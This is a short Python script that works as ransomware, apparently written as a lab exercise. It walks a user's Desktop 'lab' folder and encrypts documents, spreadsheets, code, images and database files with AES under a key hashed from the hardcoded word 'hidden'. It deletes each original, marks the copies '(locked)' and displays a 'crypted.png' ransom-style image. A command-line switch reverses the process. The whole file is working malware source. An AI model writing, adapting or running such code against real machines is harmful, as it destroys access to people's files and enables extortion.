from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os
import sys
import random
import os
from PIL import Image

def throw_background():
	img = Image.open('crypted.png')
	img.show()

def unlocked(hash,file):
	chunk_size = 64 * 1024
	print(file + "OKs")
	file_aux = os.path.basename(file)
	file_aux = file_aux.replace("(locked)","")
	out_file = os.path.join(os.path.dirname(file), file_aux)

	with open(file, "rb") as infile:
		filesize = infile.read(16)
		vect = infile.read(16)
	
		unlocker = AES.new(hash, AES.MODE_CBC, vect)

		with open(out_file, "wb") as outfile:
			while True:
				chunk = infile.read(chunk_size)
				if len(chunk) == 0:
					break
				outfile.write(unlocker.decrypt(chunk))
			outfile.truncate(int(filesize))	
	

def locked(hash,file):
	print("Chegando")
	chunk_size = 64 * 1024
	out_file = os.path.join(os.path.dirname(file), "(locked)" + os.path.basename(file))
	file_size = str(os.path.getsize(file)).zfill(16)
	vect = ''

	for i in range(16):
		vect += chr(random.randint(0, 0xFF))

	locker = AES.new(hash, AES.MODE_CBC, vect)

	with open(file,"rb") as infile:
		with open(out_file,"wb") as outfile:
			outfile.write(file_size)
			outfile.write(vect)
			while True:
				chunk = infile.read(chunk_size)

				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' ' * (16 - (len(chunk) % 16))
				outfile.write(locker.encrypt(chunk))
		



def get_files(path,username):
	files = []
	for path_file ,sub, file in os.walk(path):	
		for file_name in file:
			if file_name == "bwlocked.py" or file_name == "crypted.png":
				continue
			files.append(os.path.join(path_file,file_name))
	return files

def gethash(hidden_world):
	hasher = SHA256.new(hidden_world)

	return hasher.digest()

def main():
	username = os.getenv('username')
	path = "C:/Users/" + username +"/Desktop/lab"
	valid_extension = [".txt",".py",".php", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"]
	choice = "L"
	if len(sys.argv) > 1:
		choice = str(sys.argv[1])
	files = get_files(path,username)
	print(files)
	hidden = "hidden"
	if choice == "L":
		for files_only in files:
			if os.path.basename(files_only).startswith("(locked)"):
				print(files_only)
				pass
			else:
				extension = os.path.splitext(files_only)[1]
				if extension in valid_extension:
					try:
						locked(gethash(hidden),str(files_only))
						os.remove(files_only)
					except:
						print("problema")
						pass
		throw_background()
	elif choice == "U":
		for files_only in files:
			if os.path.basename(files_only).startswith("(locked)"):
				unlocked(gethash(hidden),str(files_only))
				os.remove(files_only)
			
			else:
				pass
			
			
			

main()